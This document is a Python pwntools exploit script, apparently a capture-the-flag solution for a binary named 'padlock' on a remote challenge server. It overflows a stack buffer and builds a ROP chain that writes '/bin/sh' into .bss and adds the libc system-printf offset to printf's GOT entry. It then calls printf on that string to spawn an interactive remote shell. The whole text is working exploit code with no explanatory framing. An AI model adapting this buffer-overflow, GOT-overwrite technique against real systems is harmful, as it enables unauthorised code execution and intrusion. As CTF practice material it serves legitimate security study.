#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./padlock', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.arch = 'amd64'

OFFSET_TO_RIP = 88
print((libc.sym['system'] - libc.sym['printf']))
difference = (libc.sym['system'] - libc.sym['printf'])
GOT_PRINTF = elf.got['printf']
VULN = elf.sym['vuln']

PLT_PRINTF = elf.plt['printf']
BSS = elf.bss() + 0x200 #to avoid overwriting existing global variables


print(f"[*] delta          = {hex(difference & 0xffffffffffffffff)}")
print(f"[*] GOT_PRINTF     = {hex(GOT_PRINTF)}")
print(f"[*] add_what_where = {hex(elf.sym.add_what_where)}")
print(f"[*] VULN           = {hex(VULN)}")

#p = process(elf.path)
p = remote("offsec.m0lecon.it", 13584)

payload1 = flat(
b'1' * OFFSET_TO_RIP,
    # write "/bin/sh" into .bss
    p64(elf.sym.pop_rdi_ret), p64(BSS),
    p64(elf.sym.pop_rsi_ret), p64(u64(b'/bin/sh\x00')),
    p64(elf.sym.add_what_where),

    #add difference to got.printf, so that it now resolves to system instead
    p64(elf.sym.pop_rdi_ret), p64(GOT_PRINTF),
    p64(elf.sym.pop_rsi_ret), p64(difference & 0xffffffffffffffff),
    p64(elf.sym.add_what_where), 
    
    # call printf(BSS), which is really system("/bin/sh")
    p64(elf.sym.pop_rdi_ret), p64(BSS),
    p64(elf.sym.ret_gadget),
    p64(PLT_PRINTF)
    )
p.recvuntil(b'combination:')
p.send(payload1)
p.recvuntil(b'Click.\n')



p.interactive()
